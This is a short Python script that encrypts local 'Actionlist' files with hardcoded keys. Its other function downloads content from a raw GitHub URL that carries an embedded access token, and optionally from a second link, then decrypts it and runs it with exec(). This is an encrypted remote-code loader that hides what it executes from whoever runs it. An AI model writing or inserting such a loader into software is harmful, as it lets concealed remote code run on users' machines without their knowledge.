import urllib.request
import base64
import hashlib
from cryptography.fernet import Fernet

def setkey(key1, key2):
  key = key1 + key2
  m = hashlib.md5(key.encode())
  output = (m.hexdigest()) + "17462047900="
  return output

def encrypt(key, input, output):
  fernet = Fernet(key)
  f = open(input, 'r')
  data = f.read()
  print(data)
  f.close()
  encpoop = fernet.encrypt(data.encode())
  f = open(output, 'w')
  hoop = str(encpoop, 'utf-8')
  f.write(hoop)
  f.close()

def decode(encpoop, key):
  fernet = Fernet(key)
  decMessage = fernet.decrypt(encpoop).decode()
  return decMessage

def getcode(var, datakey, optionallink):
  link2 = 'https://raw.githubusercontent.com/Dirbis/SlipSlop/main/al1?token=AQQ7YLIDYIVQMRZN32IYKR3APOPIA'
  response = urllib.request.urlopen(link2)
  data2 = response.read()
  key = setkey(var, datakey)
  if optionallink != 1:
    link1 = optionallink
    response = urllib.request.urlopen(link1)
    data1 = response.read()
    out = decode(data1, key)
    exec(out, globals())
  key = setkey("default","default")
  out = decode(data2, key)
  exec(out, globals())

def tempo():
  key1 = setkey('default','default')
  key2 = setkey('317397974768549889', 'keason123')
  encrypt(key1, 'Actionlist1', 'output1')
  encrypt(key2, 'Actionlist2', 'output2')
tempo()
